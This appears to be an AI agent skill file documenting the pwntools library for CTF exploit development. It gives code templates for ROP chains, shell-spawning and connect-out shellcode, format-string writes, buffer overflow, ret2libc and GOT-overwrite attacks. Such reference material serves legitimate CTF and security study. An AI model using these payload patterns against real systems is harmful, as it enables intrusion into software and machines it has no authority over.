---
name: re-pwntools
description: "pwntools exploit development framework: process interaction, shellcode, ROP chains, ELF analysis, CTF utilities. Use for: CTF challenges, exploit development, binary interaction, shellcode crafting, format string exploits, buffer overflows. Triggers: pwntools, pwn, exploit script, ROP chain, shellcode, CTF pwn, buffer overflow exploit."
---

# pwntools

Python library for CTF and exploit development.

## Quick Start

```python
from pwn import *

# Local process
p = process("./binary")

# Remote connection
r = remote("host", port)

# SSH
s = ssh("user", "host", password="pass")
sh = s.process("./binary")

# Basic interaction
p.sendline(b"input")
p.recvline()
p.interactive()
```

## Process Interaction

```python
# Send data
p.send(b"data")           # No newline
p.sendline(b"data")       # With newline
p.sendafter(b"prompt", b"data")
p.sendlineafter(b"prompt", b"data")

# Receive data
p.recv(n)                 # n bytes
p.recvline()              # Until newline
p.recvuntil(b"marker")    # Until marker
p.recvall()               # All remaining
p.clean()                 # Clear buffer

# Interactive shell
p.interactive()
```

## Packing/Unpacking

```python
# 32-bit
p32(0x12345678)           # Pack to bytes
u32(b"\x78\x56\x34\x12")  # Unpack to int

# 64-bit
p64(0x12345678deadbeef)
u64(b"\xef\xbe\xad\xde...")

# Configurable
pack(0x1234, 16)          # 16-bit
context.endian = 'big'    # Change endianness
```

## Context

```python
context.arch = 'amd64'    # or 'i386', 'arm', 'aarch64'
context.os = 'linux'
context.endian = 'little'
context.log_level = 'debug'  # Verbose output

# Quick setup
context.binary = './binary'  # Auto-detect arch
```

## ELF Analysis

```python
elf = ELF("./binary")

# Addresses
elf.symbols['main']       # Symbol address
elf.got['puts']           # GOT entry
elf.plt['puts']           # PLT entry
elf.functions['main']     # Function object

# Security
elf.checksec()            # Show protections

# Searching
elf.search(b"/bin/sh")    # Find bytes
next(elf.search(b"/bin/sh"))
```

## ROP Chains

```python
elf = ELF("./binary")
rop = ROP(elf)

# Build chain
rop.call('puts', [elf.got['puts']])
rop.call('main')

# Or use gadgets
rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(0x12345678)

# Get payload
payload = rop.chain()
print(rop.dump())         # Show chain
```

## Shellcraft

```python
# Set architecture first
context.arch = 'amd64'

# Generate shellcode
shellcode = asm(shellcraft.sh())          # /bin/sh
shellcode = asm(shellcraft.cat('flag'))   # Read file
shellcode = asm(shellcraft.connect('host', port))

# Custom assembly
code = asm('''
    mov rax, 59
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')
```

## Format Strings

```python
# Auto-generate payload
fmtstr = FmtStr(execute_fmt)
fmtstr.write(target_addr, value)
fmtstr.execute_writes()

# Manual
payload = fmtstr_payload(offset, {addr: value})
```

## GDB Integration

```python
# Debug with GDB
p = gdb.debug("./binary", '''
    break main
    continue
''')

# Attach to process
p = process("./binary")
gdb.attach(p, '''
    break *0x401234
''')
```

## Common CTF Patterns

### Buffer Overflow

```python
from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

offset = cyclic_find(0x61616167)  # Find offset
payload = flat(
    b'A' * offset,
    elf.symbols['win']
)
p.sendline(payload)
p.interactive()
```

### ret2libc

```python
libc = ELF("./libc.so.6")
elf = ELF("./binary")

# Leak libc address
p.sendline(payload_leak)
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Build ROP
rop = ROP(libc)
rop.call('system', [next(libc.search(b'/bin/sh'))])
```

### GOT Overwrite

```python
payload = fmtstr_payload(offset, {
    elf.got['exit']: elf.symbols['win']
})
```

For detailed API reference, see: [references/api.md](references/api.md)

## Integration

For dynamic analysis, use `/re-frida` or `/re-gdb`.
For static analysis, use `/re-ghidra` or `/re-radare2`.
For binary patching, use `/re-patchelf`.
